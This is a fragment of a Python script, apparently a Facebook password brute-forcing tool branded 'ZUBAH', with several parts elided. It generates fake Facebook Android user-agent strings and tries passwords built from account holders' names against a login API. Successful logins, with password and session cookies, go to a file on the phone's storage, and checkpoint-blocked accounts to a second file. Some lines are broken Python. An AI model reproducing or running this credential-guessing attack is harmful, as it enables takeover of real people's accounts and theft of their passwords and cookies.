...
def mn():
	print(f"{R}➤{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}➤ ")
	Usman = com.facebook.katana
def fire():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/Usman;FBDV/Redmi Note 2;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
        return ua
os.system("clear")
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r\r{R}({A}ZUBAH-123{R}) {R}- {R}({A}METHOD-N{R}) {R}- {R}({A}%s{R}) {R}- {R}({A}%s{R}) {R}- {R}({A}%s{R}) '%(loop,len(oks),len(cps)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/Zubah-OK.txt', 'a').write(ids+' | '+pas+' | '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{R}({A}DEATH{R}) '+ids+' | '+pas+'{R}')
                                                open('/sdcard/Zubah-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
